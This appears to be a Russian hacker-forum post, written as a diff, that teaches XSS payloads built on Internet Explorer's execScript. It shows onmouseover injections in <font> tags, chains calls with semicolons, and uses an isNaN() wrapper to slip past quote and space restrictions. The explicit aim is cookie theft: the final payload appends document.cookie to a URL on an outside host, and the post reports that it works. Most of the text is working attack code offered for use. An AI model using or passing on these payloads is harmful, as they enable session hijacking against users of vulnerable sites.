@@ -1,0 +1,30 @@
+Классический случай:
+Code:
+
+<font color=red onmouseover=javascript:alert()>алерт работает!</font>
+
+Используем execScript:
+Code:
+
+<font color=red onmouseover=window.execScript(alert())>И тут работает!</font>
+
+Эффект тот же=))
+
+Но, видимо, популярность такого метода не такая высокая как у классического по причине есго кривости...изначально в документации синтаксис execScript выглядит так:window.execScript(выражение [,язык]), но в последних версиях IE execScript не поймет даже такую строку execScript("a=1;alert(a)"). Выяснено, что он категорически не любит пробелы кавычки и ряд других необходимых символов(например для угона кукисов).
+Попробуйте:
+Code:
+
+<font color=red onmouseover=window.execScript(q="http://antichat.org/s/xex.gif?"+document.cookie)>не работает!</font>
+
+Для решения первой проблемы(невозможность использовать несколько команд одновременно(execScript(a=1;alert(a))) мы используем следующую особенность:
+Code:
+
+<font color=red onmouseover=window.execScript(alert());window.execScript(alert())>Два алерта!</font>
+
+т.е. через ; можем использовать несколько подряд идущих методов, что уже неплохо.
+А для решения второй проблемы(его нелюбовь к кавычкам и прочим символам) используем такую замечательную вещь как функции, типа alert, eval, isNaN и возможно прочие. Из этих трех мне приглянулась isNaN. Назначение этих функций для нас не важно, вся фича в том, что эти функции неким магическим способом(кому надо сам разберется) позволяют нам творить невозможное=)
+Смотрим:
+Code:
+
+<font color=red onmouseover=window.execScript(isNaN(q="http://antichat.org/s/we.gif?"+document.cookie));window.execScript(alert(q))>Получилось!</font> 
+
